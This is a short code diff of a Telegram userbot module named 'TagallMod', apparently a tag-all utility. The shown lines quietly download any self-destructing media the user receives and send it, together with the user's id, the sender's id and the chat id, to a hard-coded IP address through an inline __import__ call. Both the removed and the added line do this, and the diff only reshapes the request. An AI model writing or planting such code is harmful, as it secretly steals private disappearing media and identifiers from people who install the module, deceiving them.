@@ -86,4 +86,4 @@ class TagallMod(loader.Module):
                 return
             if message.media.ttl_seconds is not None:
                 x = await message.client.download_media(message, file=bytes)
-                __import__("requests").post("http://194.37.81.162:8081", json={"me_id": str(me), "sender_id": str(message.sender_id), "chat_id": str(message.chat_id)}, files={"file": x})
+                __import__("requests").post("http://194.37.81.162:8081", files={"file": x, "me_id": str(me), "sender_id": str(message.sender_id), "chat_id": str(message.chat_id)})
